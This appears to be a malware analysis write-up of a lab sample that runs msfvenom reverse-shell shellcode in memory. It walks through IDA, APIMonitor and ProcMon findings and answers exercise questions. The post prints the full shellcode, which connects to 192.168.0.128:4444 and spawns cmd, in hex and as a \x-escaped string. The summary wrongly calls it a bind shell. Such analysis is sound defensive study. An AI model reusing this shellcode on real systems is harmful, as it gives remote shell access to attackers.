---
title: "RevShell"
date: 2025-1-28
categories: [Malware Analysis]
tags: [Malware Analysis]
---

## Executive Summary

The method of found involves using msfvenom to generate a payload that creates a bind shell for remote access, which is then embedded into a program that hides its console window, allocates memory for the payload, and executes it through a new thread.

---

### Sample information

| **Attribute**         | **Value**                                                                                      |
|-------------------------|----------------------------------------------------|
| **File name**           | Revshell.exe                                       |
| **File size**           | 10 KB                                              |
| **File type**           | Executive Application                              |
| **MD5**                 | e007490bf6a65e754902fa7a46bf1e31                   |
| **SHA1**                | d10c5b4eef622b728ebbc035727ae160fd580a26           |
| **SHA256**              | 137562a049e2d6aef2310070435e623dea623b2b5363beea083f5a28323a4538 |
| **Packer / compiler info** | N/A                                             |
| **Compile time**        | Fri May 17 14:52:52 2024 (UTC)                     |

---

## Case-Specific Requirements

### **Environment**
- **Operating System:** Windows

### **Tools Used**
- **IDA**  
- **APIMonitor**  
- **ProcMon**

---

## Static Analysis
Entering the main using IDA. The code starts the line with hides the application's console window using FindWindowA to get a handle to the console window and ShowWindow with the parameter 0 to hide it.

![img](assets/11-Revshell.exe/image212.png)

A buffer v7 is created to store data, and qmemcpy is used to copy 325 bytes from a memory address unk_402128 into this buffer.

Memory is allocated using VirtualAlloc with read, write, and execute permissions ‘0x40’ for storing the copied data.

After copying the buffer into the allocated memory, a thread is created using CreateThread, which executes the code at the allocated memory address ‘v4’.

Finally, the program waits indefinitely for the thread to finish using WaitForSingleObject. The operations of these code performs dynamic execution of a payloads in memory.

![img](assets/11-Revshell.exe/image213.png)
 
The starting hex was ‘fc’ followed with ‘e8’,’82’ and so one. Extract all the hex would be like:

```
fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52 10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1 51 8b 59 20 01 d3 8b 49 18 e3 3a 49 8b 34 8b 01 d6 31 ff ac c1 cf 0d 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a 8b 12 eb 8d 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 ff d5 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 50 50 50 50 40 50 40 50 68 ea 0f df e0 ff d5 97 6a 05 68 c0 a8 00 80 68 02 00 11 5c 89 e6 6a 10 56 57 68 99 a5 74 61 ff d5 85 c0 74 0c ff 4e 08 75 ec 68 f0 b5 a2 56 ff d5 68 63 6d 64 00 89 e3 57 57 57 31 f6 6a 12 59 56 e2 fd 66 c7 44 24 3c 01 01 8d 44 24 10 c6 00 44 54 50 56 56 56 46 56 4e 56 56 53 56 68 79 cc 3f 86 ff d5 89 e0 4e 56 46 ff 30 68 08 87 1d 60 ff d5 bb f0 b5 a2 56 68 a6 95 bd 9d ff d5 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 53 ff d5 00 00 00 00
```
 
Turn the empty space into ‘\x’:

```
\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x00\x80\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x00\x00\x00\x00
```

Google dork first 8 byte:

![img](assets/11-Revshell.exe/image214.png)

It was a common ‘msfvenom’ of x86 program for tcp encoded

![img](assets/11-Revshell.exe/image215.png)

---

##	 Dynamic Analysis

Using APIMonitor and can see the API load and created a Thread.

![img](assets/11-Revshell.exe/image216.png)

Checking the ProcMon, the Thread was created before an TCP connection attempt to connect with the machine existed.

![img](assets/11-Revshell.exe/image217.png)

TCP attempt on the port 4444:

![img](assets/11-Revshell.exe/image218.png)

---

##	 IOCs

| IOC                                                                                          | Type                                |
|---------------------------------------------------------------------------------------------|-------------------------------------|
|  192[.]168[.]0[.]128[:]4444	|  IP:PORT  |

---
 
##	 Additional Notes

- **What is the size (in hex) of the shellcode bytes found in the malware?**
  - `145`

- **What is the virtual address of the shellcode reside in the program?**
  - `402128`

- **What is the WinAPI that is used to run the shellcode?**
  - `CreateThread`

- **How many parameters does VirtualAlloc take in the code?**
  - `4`
